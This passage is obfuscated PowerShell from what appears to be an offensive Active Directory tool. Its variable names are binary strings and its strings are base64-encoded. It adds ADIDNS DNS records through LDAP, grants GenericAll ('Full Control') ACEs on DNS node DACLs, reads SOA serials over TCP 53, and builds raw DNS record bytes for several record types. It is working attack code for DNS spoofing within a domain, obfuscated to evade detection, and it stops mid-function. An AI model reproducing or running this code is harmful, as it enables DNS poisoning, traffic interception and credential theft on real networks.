        ${10111000010110010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0AJAB7AF8AMQAwADAAMAAwADAAMQAxADEAMAAwADAAMQAwADEAMQAxAH0ALABEAEMAPQAkAHsAXwAwADEAMQAxADEAMQAxADEAMQAxADAAMAAwADEAMQAxADEAfQAsAEMATgA9AE0AaQBjAHIAbwBzAG8AZgB0AEQATgBTACwARABDAD0AJAB7AF8AMAAwADAAMAAxADAAMQAxADAAMAAxADEAMAAxADAAMAAxAH0A')))
        ${00111100010010100} = ${_01011011111110110}.Split(".")
        foreach(${00111100101111111} in ${00111100010010100})
        {
            ${10111000010110010} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQAkAHsAMAAwADEAMQAxADEAMAAwADEAMAAxADEAMQAxADEAMQAxAH0A')))
        }
        if(${_10011000001001110})
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA='))),${_10011000001001110}.UserName,${_10011000001001110}.GetNetworkCredential().Password)
        }
        else
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA=')))
        }
        try
        {
            ${00001011010000010} = ${01000001100111001}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAVABvAG0AYgBzAHQAbwBuAGUAZAA='))))
            ${_10001010010110110} = ${01000001100111001}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAUgBlAGMAbwByAGQA'))))
        }
        catch
        {
            if($_.Exception.Message -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBFAHgAYwBlAHAAdABpAG8AbgAgAGMAYQBsAGwAaQBuAGcAIAAiAEkAbgB2AG8AawBlAEcAZQB0ACIAIAB3AGkAdABoACAAIgAxACIAIABhAHIAZwB1AG0AZQBuAHQAKABzACkAOgAgACIAVABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGQAaQByAGUAYwB0AG8AcgB5ACAAcwBlAHIAdgBpAGMAZQAgAGEAdAB0AHIAaQBiAHUAdABlACAAbwByACAAdgBhAGwAdQBlACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0AC4AKgA='))) -and
            $_.Exception.Message -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBUAGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAZQB4AGMAZQBwAHQAaQBvAG4AIABvAGMAYwB1AHIAcgBlAGQAIAB3AGgAaQBsAGUAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAbQBlAG0AYgBlAHIAIAAiAEkAbgB2AG8AawBlAEcAZQB0ACIAOgAgACIAVABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGQAaQByAGUAYwB0AG8AcgB5ACAAcwBlAHIAdgBpAGMAZQAgAGEAdAB0AHIAaQBiAHUAdABlACAAbwByACAAdgBhAGwAdQBlACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0AC4AKgA='))))
            {
                ${01100011111101101} = $_.Exception.Message
                ${01100011111101101} = ${01100011111101101} -replace "`n",""
                ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
            }
        }
        if(${01000001100111001}.Path)
        {
            ${01000001100111001}.Close()
        }
        ${01011101100001110} = $false
        if(${00001011010000010} -and ${_10001010010110110})
        {
            if(${_10001010010110110}[0].GetType().name -eq [Byte])
            {
                if(${_10001010010110110}.Count -ge 32 -and ${_10001010010110110}[2] -eq 0)
                {
                    ${01011101100001110} = $true
                }
            }
        }
        return ${01011101100001110}
    }
    function _10010001101101011
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
            "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
            "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]${_11000000100101000} = "GenericAll",
            [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]${_10110011101001001} = "Allow",    
            [parameter(Mandatory=$false)][String]${_01110001110100011},
            [parameter(Mandatory=$false)][String]${_01011011111110110},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$false)][String]${_10000011100010111},
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]${_00001011001101001} = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]${_01001100100001001},
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_10011000001001110},
            [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
        )
        if(${_00001011001101001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0A'))))
        {
            ${10111000010110010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0AJAB7AF8AMQAwADAAMAAwADAAMQAxADEAMAAwADAAMQAwADEAMQAxAH0ALABEAEMAPQAkAHsAXwAwADEAMQAxADEAMQAxADEAMQAxADAAMAAwADEAMQAxADEAfQAsAEMATgA9AE0AaQBjAHIAbwBzAG8AZgB0AEQATgBTACwAQwBOAD0AJAB7AF8AMAAwADAAMAAxADAAMQAxADAAMAAxADEAMAAxADAAMAAxAH0A')))
        }
        else
        {
            ${10111000010110010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0AJAB7AF8AMQAwADAAMAAwADAAMQAxADEAMAAwADAAMQAwADEAMQAxAH0ALABEAEMAPQAkAHsAXwAwADEAMQAxADEAMQAxADEAMQAxADAAMAAwADEAMQAxADEAfQAsAEMATgA9AE0AaQBjAHIAbwBzAG8AZgB0AEQATgBTACwARABDAD0AJAB7AF8AMAAwADAAMAAxADAAMQAxADAAMAAxADEAMAAxADAAMAAxAH0A')))
        }
        ${00111100010010100} = ${_01011011111110110}.Split(".")
        ForEach(${00111100101111111} in ${00111100010010100})
        {
            ${10111000010110010} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQAkAHsAMAAwADEAMQAxADEAMAAwADEAMAAxADEAMQAxADEAMQAxAH0A')))
        }
        if(${_10011000001001110})
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA='))),${_10011000001001110}.UserName,${_10011000001001110}.GetNetworkCredential().Password)
        }
        else
        {
            ${01000001100111001} = New-Object System.DirectoryServices.DirectoryEntry $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAvACQAewAxADAAMQAxADEAMAAwADAAMAAxADAAMQAxADAAMAAxADAAfQA=')))
        }
        try
        {
            ${00100001000111111} = New-Object System.Security.Principal.NTAccount(${_01001100100001001})
            ${00011001110010101} = ${00100001000111111}.Translate([System.Security.Principal.SecurityIdentifier])
            ${01011011100101011} = [System.Security.Principal.IdentityReference]${00011001110010101}
            ${01100011100100101} = [System.DirectoryServices.ActiveDirectoryRights]${_11000000100101000}
            ${00100010100111100} = [System.Security.AccessControl.AccessControlType]${_10110011101001001}
            ${00011111011011011} = [System.DirectoryServices.ActiveDirectorySecurityInheritance]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))
            ${01100110011111101} = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(${01011011100101011},${01100011100100101},${00100010100111100},${00011111011011011})
        }
        catch
        {
            ${01100011111101101} = $_.Exception.Message
            ${01100011111101101} = ${01100011111101101} -replace "`n",""
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        }
        try
        {
            ${01000001100111001}.psbase.ObjectSecurity.AddAccessRule(${01100110011111101})
            ${01000001100111001}.psbase.CommitChanges()
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for ${_01001100100001001} to ${_10000011100010111} DACL") > $null
        }
        catch
        {
            ${01100011111101101} = $_.Exception.Message
            ${01100011111101101} = ${01100011111101101} -replace "`n",""
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        }
        if(${01000001100111001}.Path)
        {
            ${01000001100111001}.Close()
        }
        return ${00011010011110111}
    }
    function _10110111010110110
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_01001100010001111},    
            [parameter(Mandatory=$false)][String]${_01110001110100011},
            [parameter(Mandatory=$false)][String]${_01011011111110110},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$false)][String]${_01000000000001011},
            [parameter(Mandatory=$true)][String]${_10000011100010111},
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]${_00001011001101001} = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]${_10110011101001001},
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][Int]${_00010010110111100},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_10011000001001110}
        )
        $null = [System.Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBQAHIAbwB0AG8AYwBvAGwAcwA='))))
        ${10111000010110010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0AJAB7AF8AMQAwADAAMAAwADAAMQAxADEAMAAwADAAMQAwADEAMQAxAH0ALABEAEMAPQAkAHsAXwAwADEAMQAxADEAMQAxADEAMQAxADAAMAAwADEAMQAxADEAfQAsAEMATgA9AE0AaQBjAHIAbwBzAG8AZgB0AEQATgBTACwARABDAD0AJAB7AF8AMAAwADAAMAAxADAAMQAxADAAMAAxADEAMAAxADAAMAAxAH0A')))
        ${00111100010010100} = ${_01011011111110110}.Split(".")
        foreach(${00111100101111111} in ${00111100010010100})
        {
            ${10111000010110010} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQAkAHsAMAAwADEAMQAxADEAMAAwADEAMAAxADEAMQAxADEAMQAxAH0A')))
        }
        [Byte[]]${_10001010010110110} = _01110111001011001 -_01001100010001111 ${_01001100010001111} -_10100000011110001 ${_10100000011110001} -_10110011101001001 ${_10110011101001001} -_00010010110111100 ${_00010010110111100} -_01111111110001111 ${_01111111110001111}
        ${10100100111100101} = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(${_10100000011110001},389)
        if(${_10011000001001110})
        {
            ${01010001001110110} = New-Object System.DirectoryServices.Protocols.LdapConnection(${10100100111100101},${_10011000001001110}.GetNetworkCredential())
        }
        else
        {
            ${01010001001110110} = New-Object System.DirectoryServices.Protocols.LdapConnection(${10100100111100101})
        }
        ${10101000111010101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0ARABuAHMALQBOAG8AZABlACwAQwBOAD0AUwBjAGgAZQBtAGEALABDAE4APQBDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuAA==')))
        ${10000111000011010} = ${_01000000000001011}.Split(".")
        foreach(${00111100101111111} in ${10000111000011010})
        {
            ${10101000111010101} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQAkAHsAMAAwADEAMQAxADEAMAAwADEAMAAxADEAMQAxADEAMQAxAH0A')))
        }
        try
        {
            ${01010001001110110}.SessionOptions.Sealing = $true
            ${01010001001110110}.SessionOptions.Signing = $true
            ${01010001001110110}.Bind()
            ${10101100010001110} = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
            ${10101100010001110}.DistinguishedName = ${10111000010110010}
            ${10101100010001110}.Attributes.Add((New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBQAHIAbwB0AG8AYwBvAGwAcwAuAEQAaQByAGUAYwB0AG8AcgB5AEEAdAB0AHIAaQBiAHUAdABlAA=='))) -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAQwBsAGEAcwBzAA=='))),@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMATgBvAGQAZQA=')))))) > $null
            ${10101100010001110}.Attributes.Add((New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBQAHIAbwB0AG8AYwBvAGwAcwAuAEQAaQByAGUAYwB0AG8AcgB5AEEAdAB0AHIAaQBiAHUAdABlAA=='))) -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AA=='))),${10101000111010101})) > $null
            ${10101100010001110}.Attributes.Add((New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBQAHIAbwB0AG8AYwBvAGwAcwAuAEQAaQByAGUAYwB0AG8AcgB5AEEAdAB0AHIAaQBiAHUAdABlAA=='))) -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAUgBlAGMAbwByAGQA'))),${_10001010010110110})) > $null
            ${10101100010001110}.Attributes.Add((New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBQAHIAbwB0AG8AYwBvAGwAcwAuAEQAaQByAGUAYwB0AG8AcgB5AEEAdAB0AHIAaQBiAHUAdABlAA=='))) -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABOAFMAVABvAG0AYgBzAHQAbwBuAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUARQA='))))) > $null
            ${01010001001110110}.SendRequest(${10101100010001110}) > $null
            ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node ${_10000011100010111} type ${_10110011101001001} added to ${_01111111110001111}") > $null
            ${00011010011110111} = $true
            ${00101000010000101}.ADIDNS_table.${_10000011100010111} = "1"
        }
        catch
        {
            ${01100011111101101} = $_.Exception.Message
            ${01100011111101101} = ${01100011111101101} -replace "`n",""
            ${00011010011110111} = $false
            if($_.Exception.Message -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AIABjAGEAbABsAGkAbgBnACAAIgBTAGUAbgBkAFIAZQBxAHUAZQBzAHQAIgAgAHcAaQB0AGgAIAAiADEAIgAgAGEAcgBnAHUAbQBlAG4AdAAoAHMAKQA6ACAAIgBUAGgAZQAgAG8AYgBqAGUAYwB0ACAAZQB4AGkAcwB0AHMALgAiAA=='))))
            {
                ${00101000010000101}.ADIDNS = $null
                ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
                ${00101000010000101}.ADIDNS_table.${_10000011100010111} = "0"
            }
        }
        return ${00011010011110111}
    }
    function _01010010111010000
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$false)][String]${_01111111110001111}
        )
        ${_01111111110001111} = ${_01111111110001111}.ToLower()
        function _01111101011010101($Field)
        {
            [Array]::Reverse($Field)
            return [System.BitConverter]::ToUInt16($Field,0)
        }
        function _00000110001100101(${_01110100101001100})
        {
            foreach($field in ${_01110100101001100}.Values)
            {
                ${10000100000101111} += $field
            }
            return ${10000100000101111}
        }
        function _01110100001100011
        {
            param([Int]${_00011001011000011},[Int]${_00111100100011001}=1,[Int]${_10100010010101001}=255)
            [String]${01000111110011101} = [String](1..${_00011001011000011} | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum ${_00111100100011001} -Maximum ${_10100010010101001})})
            [Byte[]]${01000111110011101} = ${01000111110011101}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
            return ${01000111110011101}
        }
        function _01001101101110101
        {
            param([String]${_10111001010101001})
            ${00110111011010110} = ${_10111001010101001}.ToCharArray()
            [Array]${01100100111101111} = 0..(${00110111011010110}.Count - 1) | ? {${00110111011010110}[$_] -eq '.'}
            if(${01100100111101111}.Count -gt 0)
            {
                ${01111000100001100} = 0
                foreach(${_01110100001100111} in ${01100100111101111})
                {
                    ${01111100101110010} = ${_01110100001100111} - ${01111000100001100}
                    [Byte[]]${10100101110010000} += ${01111100101110010}
                    [Byte[]]${10100101110010000} += [System.Text.Encoding]::UTF8.GetBytes(${_10111001010101001}.Substring(${01111000100001100},${01111100101110010}))
                    ${01111000100001100} = ${_01110100001100111} + 1
                }
                [Byte[]]${10100101110010000} += (${_10111001010101001}.Length - ${01111000100001100})
                [Byte[]]${10100101110010000} += [System.Text.Encoding]::UTF8.GetBytes(${_10111001010101001}.Substring(${01111000100001100}))
            }
            else
            {
                [Byte[]]${10100101110010000} = ${_10111001010101001}.Length
                [Byte[]]${10100101110010000} += [System.Text.Encoding]::UTF8.GetBytes(${_10111001010101001}.Substring(${01111000100001100}))
            }
            return ${10100101110010000}
        }
        function _00111001101000100
        {
            param([String]${_10111001010101001})
            [Byte[]]${_10110011101001001} = 0x00,0x06
            [Byte[]]${_10111001010101001} = (_01001101101110101 ${_10111001010101001}) + 0x00
            [Byte[]]${_00011001011000011} = [System.BitConverter]::GetBytes(${_10111001010101001}.Count + 16)[1,0]
            [Byte[]]${10011111100111011} = _01110100001100011 2
            ${01100111001100001} = New-Object System.Collections.Specialized.OrderedDictionary
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${_00011001011000011})
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGEAYwB0AGkAbwBuAEkARAA='))),${10011111100111011})
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x01,0x00))
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcwB0AGkAbwBuAHMA'))),[Byte[]](0x00,0x01))
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAdwBlAHIAUgBSAHMA'))),[Byte[]](0x00,0x00))
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB0AHkAUgBSAHMA'))),[Byte[]](0x00,0x00))
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQB0AGkAbwBuAGEAbABSAFIAcwA='))),[Byte[]](0x00,0x00))
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgBpAGUAcwBfAE4AYQBtAGUA'))),${_10111001010101001})
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgBpAGUAcwBfAFQAeQBwAGUA'))),${_10110011101001001})
            ${01100111001100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgBpAGUAcwBfAEMAbABhAHMAcwA='))),[Byte[]](0x00,0x01))
            return ${01100111001100001}
        }
        ${01011000101100010} = New-Object System.Net.Sockets.TCPClient
        ${01011000101100010}.Client.ReceiveTimeout = 3000
        try
        {
            ${01011000101100010}.Connect(${_10100000011110001},"53")
            ${10110111011111110} = ${01011000101100010}.GetStream()
            ${00000000101110100} = New-Object System.Byte[] 2048
            ${01001101111111001} = _00111001101000100 ${_01111111110001111}
            [Byte[]]${10011011111111001} = _00000110001100101 ${01001101111111001}
            ${10110111011111110}.Write(${10011011111111001},0,${10011011111111001}.Length) > $null
            ${10110111011111110}.Flush()   
            ${10110111011111110}.Read(${00000000101110100},0,${00000000101110100}.Length) > $null
            ${01011000101100010}.Close()
            ${10110111011111110}.Close()
            if(${00000000101110100}[9] -eq 0)
            {
                ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAXwAwADEAMQAxADEAMQAxADEAMQAxADAAMAAwADEAMQAxADEAfQAgAFMATwBBACAAcgBlAGMAbwByAGQAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))) > $null
            }
            else
            {
                ${00010101111101010} = [System.BitConverter]::ToString(${00000000101110100})
                ${00010101111101010} = ${00010101111101010} -replace "-",""
                ${10001111011110100} = ${00010101111101010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwAwADAAQwAwADAAMAA2ADAAMAAwADEA'))))
                ${10001111011110100} = ${10001111011110100} / 2
                ${10001000111101000} = ${00000000101110100}[(${10001111011110100} + 10)..(${10001111011110100} + 11)]
                ${10001000111101000} = _01111101011010101 ${10001000111101000}
                [Byte[]]${10111110010101101} = ${00000000101110100}[(${10001111011110100} + ${10001000111101000} - 8)..(${10001111011110100} + ${10001000111101000} - 5)]
                ${10011110001111000} = [System.BitConverter]::ToUInt32(${10111110010101101}[3..0],0) + 1
                [Byte[]]${10110101010111100} = [System.BitConverter]::GetBytes(${10011110001111000})[0..3]
            }
        }
        catch
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAXwAxADAAMQAwADAAMAAwADAAMAAxADEAMQAxADAAMAAwADEAfQAgAGQAaQBkACAAbgBvAHQAIAByAGUAcwBwAG8AbgBkACAAbwBuACAAVABDAFAAIABwAG8AcgB0ACAANQAzAA==')))) > $null
        }
        return [Byte[]]${10110101010111100}
    }
    function _01110111001011001
    {
        [CmdletBinding()]
        [OutputType([Byte[]])]
        param
        (
            [parameter(Mandatory=$false)][String]${_01001100010001111},
            [parameter(Mandatory=$false)][String]${_10100000011110001},
            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]${_10110011101001001} = "A",
            [parameter(Mandatory=$false)][String]${_01111111110001111},
            [parameter(Mandatory=$false)][Int]${_00001011100010000},
            [parameter(Mandatory=$false)][Int]${_10010100101001111},
            [parameter(Mandatory=$false)][Int]${_01101000000110110},
            [parameter(Mandatory=$false)][Int]${_01000010101000110},
            [parameter(Mandatory=$false)][Int]${_00010010110111100} = 600,
            [parameter(Mandatory=$false)][Int32]${_10001100100001100},
            [parameter(Mandatory=$false)][Switch]${_10010010010111111},
            [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
        )
        ${10110001011001010} = _01010010111010000 -_10100000011110001 ${_10100000011110001} -_01111111110001111 ${_01111111110001111}
        function _01001101101110101
        {
            param([String]${_10111001010101001})
            ${00110111011010110} = ${_10111001010101001}.ToCharArray()
            [Array]${01100100111101111} = 0..(${00110111011010110}.Count - 1) | ? {${00110111011010110}[$_] -eq '.'}
            if(${01100100111101111}.Count -gt 0)
            {
                ${01111000100001100} = 0
                foreach(${_01110100001100111} in ${01100100111101111})
                {
                    ${01111100101110010} = ${_01110100001100111} - ${01111000100001100}
                    [Byte[]]${10100101110010000} += ${01111100101110010}
                    [Byte[]]${10100101110010000} += [System.Text.Encoding]::UTF8.GetBytes(${_10111001010101001}.Substring(${01111000100001100},${01111100101110010}))
                    ${01111000100001100} = ${_01110100001100111} + 1
                }
                [Byte[]]${10100101110010000} += (${_10111001010101001}.Length - ${01111000100001100})
                [Byte[]]${10100101110010000} += [System.Text.Encoding]::UTF8.GetBytes(${_10111001010101001}.Substring(${01111000100001100}))
            }
            else
            {
                [Byte[]]${10100101110010000} = ${_10111001010101001}.Length
                [Byte[]]${10100101110010000} += [System.Text.Encoding]::UTF8.GetBytes(${_10111001010101001}.Substring(${01111000100001100}))
            }
            return ${10100101110010000}
        }
        switch (${_10110011101001001})
        {
            'A'
            {
                [Byte[]]${10101100011011110} = 0x01,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes((${_01001100010001111}.Split(".")).Count))[0..1]
                [Byte[]]${00001101000010001} += ([System.Net.IPAddress][String]([System.Net.IPAddress]${_01001100010001111})).GetAddressBytes()
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBBAEEAQQA=')))
            {
                [Byte[]]${10101100011011110} = 0x1c,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes((${_01001100010001111} -replace ":","").Length / 2))[0..1]
                [Byte[]]${00001101000010001} += ([System.Net.IPAddress][String]([System.Net.IPAddress]${_01001100010001111})).GetAddressBytes()
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAEEATQBFAA==')))
            {
                [Byte[]]${10101100011011110} = 0x05,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes(${_01001100010001111}.Length + 4))[0..1]
                [Byte[]]${00001101000010001} = ${_01001100010001111}.Length + 2
                ${00001101000010001} += (${_01001100010001111}.Split(".")).Count
                ${00001101000010001} += _01001101101110101 ${_01001100010001111}
                ${00001101000010001} += 0x00
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAEEATQBFAA==')))
            {
                [Byte[]]${10101100011011110} = 0x27,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes(${_01001100010001111}.Length + 4))[0..1]
                [Byte[]]${00001101000010001} = ${_01001100010001111}.Length + 2
                ${00001101000010001} += (${_01001100010001111}.Split(".")).Count
                ${00001101000010001} += _01001101101110101 ${_01001100010001111}
                ${00001101000010001} += 0x00
            }
            'MX'
            {
                [Byte[]]${10101100011011110} = 0x0f,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes(${_01001100010001111}.Length + 6))[0..1]
                [Byte[]]${00001101000010001} = [System.Bitconverter]::GetBytes(${_00001011100010000})[1,0]
                ${00001101000010001} += ${_01001100010001111}.Length + 2
                ${00001101000010001} += (${_01001100010001111}.Split(".")).Count
                ${00001101000010001} += _01001101101110101 ${_01001100010001111}
                ${00001101000010001} += 0x00
            }
            'NS'
            {
                [Byte[]]${10101100011011110} = 0x02,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes(${_01001100010001111}.Length + 4))[0..1]
                [Byte[]]${00001101000010001} = ${_01001100010001111}.Length + 2
                ${00001101000010001} += (${_01001100010001111}.Split(".")).Count
                ${00001101000010001} += _01001101101110101 ${_01001100010001111}
                ${00001101000010001} += 0x00
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABUAFIA')))
            {
                [Byte[]]${10101100011011110} = 0x0c,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes(${_01001100010001111}.Length + 4))[0..1]
                [Byte[]]${00001101000010001} = ${_01001100010001111}.Length + 2
                ${00001101000010001} += (${_01001100010001111}.Split(".")).Count
                ${00001101000010001} += _01001101101110101 ${_01001100010001111}
                ${00001101000010001} += 0x00
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBSAFYA')))
            {
                [Byte[]]${10101100011011110} = 0x21,0x00
                [Byte[]]${01111111101111100} = ([System.BitConverter]::GetBytes(${_01001100010001111}.Length + 10))[0..1]
                [Byte[]]${00001101000010001} = [System.Bitconverter]::GetBytes(${_10010100101001111})[1,0]
                ${00001101000010001} += [System.Bitconverter]::GetBytes(${_01101000000110110})[1,0]
                ${00001101000010001} += [System.Bitconverter]::GetBytes(${_01000010101000110})[1,0]
